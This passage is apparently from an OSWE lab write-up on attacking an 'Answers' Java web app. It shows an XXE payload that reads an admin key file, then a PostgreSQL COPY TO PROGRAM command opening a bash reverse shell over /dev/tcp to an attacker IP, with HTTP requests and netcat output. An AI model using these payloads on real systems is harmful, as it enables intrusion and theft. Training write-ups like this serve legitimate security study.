				// if we are in preview mode, parse contents but don't delete anything in the DB		
				Node root = document.getDocumentElement();
				Node n;
				sb = new StringBuilder();
				if(root.getNodeName().equalsIgnoreCase("database")) {
					
					sb.append("Preview found: <br/>");
					NodeList children = root.getChildNodes();
					
					for(int i = 0; i<children.getLength();i++) {
						n = children.item(i);
						switch(n.getNodeName().toLowerCase()) {
						case "categories":
							NodeList cats = document.getElementsByTagName("category");
							recordCount = 0;
							for(int j = 0; j < cats.getLength(); j++) {
								NodeList catChildren = cats.item(j).getChildNodes();
								for(int k= 0; k< catChildren.getLength(); k++) {
									if(catChildren.item(k).getNodeName().equalsIgnoreCase("name")) {
										recordCount++;
									}
								}
							}
							sb.append(recordCount + " categories<br/>");
							break;
						case "users":
							NodeList users = document.getElementsByTagName("user");
							recordCount = users.getLength();
							sb.append(recordCount + " users<br/>");
							break;
						case "questions":
							NodeList questions = document.getElementsByTagName("question");
							recordCount = questions.getLength();
							sb.append(recordCount + " questions<br/>");
							
							break;
						case "answers":
							NodeList answers = document.getElementsByTagName("answer");
							recordCount = answers.getLength();
							sb.append(recordCount + " answers<br/>");
							break;
						}
					}
					
					return "<html>" + sb.toString()+"<br/><br/>Original value:<br/><pre lang=\"xml\">"+XmlUtil.convertXmlToString(document)+"</pre></html>";
					
				} else {
					// root element should be <database>
					logger.debug("[!] Unexpected XML document in AdminController.postImport");
					return "Unexpected XML document";
				}
			}
		} catch(Exception e) {
			logger.error(e.getMessage());
			return "Invalid XML";
		}
	}
...
```
Let's craft an XXE payload that satisfy the structure defined in the code snippet, a valid XXE that gives us the ability to read the `/home/student/adminkey.txt` would look like:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY example SYSTEM "file:///home/student/adminkey.txt">
]>
<database>
    <users>
        <user>
            <username>admin</username>
            <password>&example;</password>
            <isAdmin>true</isAdmin>
            <isMod>false</isMod>
            <email>admin@example.com</email>
        </user>
    </users>
</database>
```
Let's send this to the server and see how it responds.

Request:
```
POST /admin/import HTTP/1.1
Host: answers
Cookie: JSESSIONID=29224C25A69F34A0B13F022E1EC7E795
Content-Length: 477

preview=true&xmldata=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E+%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+example+SYSTEM+%22file%3A%2F%2F%2Fhome%2Fstudent%2Fadminkey.txt%22%3E+%5D%3E+%3Cdatabase%3E%3Cusers%3E%3Cuser%3E%3Cid%3E5%3C%2Fid%3E%3Cusername%3ECarl%3C%2Fusername%3E%3Cpassword%3E%26example%3B%3C%2Fpassword%3E%3CisAdmin%3Efalse%3C%2FisAdmin%3E%3CisMod%3Etrue%3C%2FisMod%3E%3Cemail%3Ecarl%40answers.local%3C%2Femail%3E%3C%2Fuser%3E%3C%2Fusers%3E%3C%2Fdatabase%3E
```

Response:
```
HTTP/1.1 200 
...

<html>Preview found: <br/>1 users<br/><br/><br/>Original value:<br/><pre lang="xml"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<database>
    <users>
        <user>
            <id>5</id>
            <username>Carl</username>
            <password>0cc2eebf-aa4b-4f9c-8b6c-ad7d44422d9b
</password>
            <isAdmin>false</isAdmin>
            <isMod>true</isMod>
            <email>carl@answers.local</email>
        </user>
    </users>
</database>
</pre></html>
```
Excellent! Our XXE payload worked and we could successfully read the `/home/student/adminkey.txt`, now it is the time to execute system level commands.

#### RCE — PGSQL `COPY` Function to Execute System Level Commands
Now that we have the `adminKey` required to use the endpoint `/admin/query`, so let's use the PGSQL `COPY` Function to Execute System Level Commands, out payload would look like this:
```sql
copy (select 'a') to program 'bash -c "bash -i >& /dev/tcp/192.168.45.203/1337 0>&1"';
```
Our request would look like:
```
POST /admin/query HTTP/1.1
Host: answers
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=29224C25A69F34A0B13F022E1EC7E795
Content-Length: 169

adminKey=0cc2eebf-aa4b-4f9c-8b6c-ad7d44422d9b&query=copy+%28select+%27a%27%29+to+program+%27bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.243%2F1337+0%3E%261%22%27
```

Now let's check out listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.174.234] 46738
bash: cannot set terminal process group (3105): Inappropriate ioctl for device
bash: no job control in this shell
<nswers-target-248-124:/var/lib/postgresql/10/main$
```
Excellent! now we have a reverse shell.

**Automation Script:** [rce_script.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Answers%20Application/rce_script.py) 
